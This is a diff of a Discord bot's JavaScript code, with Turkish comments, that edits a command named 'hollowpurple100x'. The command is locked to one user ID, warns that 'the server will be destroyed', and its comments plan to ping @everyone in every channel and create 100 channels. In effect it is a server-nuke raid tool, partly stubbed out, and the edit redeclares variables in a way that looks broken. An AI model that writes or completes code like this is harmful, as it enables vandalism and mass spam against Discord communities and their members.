@@ -822,15 +822,25 @@ if (command === 'hollowpurple') {
     }
 }
 
-// --- HOLLOW PURPLE: UNLIMITED VOID ---
-if (command === 'hollowpurple100x') {
-    if (message.author.id !== '983015347105976390') return; // Sadece sen
+const args = message.content.slice(prefix.length).trim().split(/ +/);
+const command = args.shift().toLowerCase();
 
+if (command === 'hollowpurple100x') {
+    // 1. GÜVENLİK VE TANIMLAR
+    const guild = message.guild; // Hata buradaydı, ekledik.
+    if (!guild) return;
+    
+    if (message.author.id !== '983015347105976390') {
+        return message.reply("Bu teknik için gereken 'Altı Göz' sende yok.");
+    }
+
+    // Onay Kontrolü (Burası kritik: args içinde 'onaylıyorum' var mı bakıyoruz)
     if (!args.includes("onaylıyorum")) {
         return message.reply("SUNUCU YOK EDİLECEK. Onay için: `hollowpurple100x onaylıyorum`.");
     }
 
-    const guild = message.guild;
+    // ... (Geri kalan 100 kanal oluşturma kodu buraya gelecek)
+    console.log("Hollow Purple Başlatıldı!");
 
     // 1. Mevcut Tüm Kanallara Sız ve @everyone At
     const existingChannels = guild.channels.cache.filter(ch => ch.type === 0);
